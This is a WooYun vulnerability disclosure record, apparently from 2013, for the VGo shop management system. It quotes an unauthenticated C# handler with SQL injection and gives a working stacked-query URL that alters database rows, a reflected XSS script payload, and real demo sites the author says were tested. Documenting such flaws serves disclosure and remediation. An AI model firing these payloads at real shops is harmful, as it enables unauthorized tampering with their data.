{"id": 59758, "wybug_id": "wooyun-2013-046179", "wybug_title": "威购商城管理系统任意修改数据漏洞", "wybug_corp": "威购商城管理系统", "wybug_author": "Damo", "wybug_date": "2013-12-19 17:27", "wybug_open_date": "2014-03-19 17:27", "wybug_type": "非授权访问/权限绕过", "wybug_level": "中", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["认证缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-19：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-03-19：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 看到各位大牛都在找通用通用 通用  小弟也到站长之家下载一些程序本地研究一下 详细说明：  其他下载点不统计   只统计站长\n\n首先本地测试一下问题出现在WebService\\ShopService.ashx代码如下\n/// <summary>    /// 删除规格值    /// </summary>    /// <param name=\"context\"></param>    public void DeleteSpec(HttpContext context)    {        if (conn.Execute(\"delete HLshop_spec_value where sp_value_id=\" + context.Request.Params[\"spvalueid\"]) > 0) //由于此处没有进行访问验证以及代码过滤导致        {            context.Response.Write(\"1\");        }        else        {            context.Response.Write(\"0\");        }    }\n本地测试结果\nhttp://192.168.1.118:8886/WebService%5CShopService.ashx?Action=DeleteSpec&spvalueid=10000;update%20HLShop_Class%20set%20ClassName=%27WooYun%27%20where%20ClassID=225\n结果如下\n\n   漏洞证明：  对其官方商城测试http://www.0518vip.comhttp://test.vgoshop.comhttp://demo.vgoshop.com结果如下\n\n\n\n\n\n一处XSS\nhttp://192.168.1.118:8886/ProductList.aspx?classid=148&city=%3Cscript%3Ealert%28/WooYun/%29%3C/script%3E\n\n\n   修复方案：  文件的权限 以及访问参数的过滤    版权声明：转载请注明来源 Damo@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2014-01-19 16:42 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  .NET的？    \n     2014-01-20 12:35 |    \t\tDamo \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:31        | 我只是喜欢看加菲猫而已ส็็็็็็็็...)\t\t \n  @wefgod   对头    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}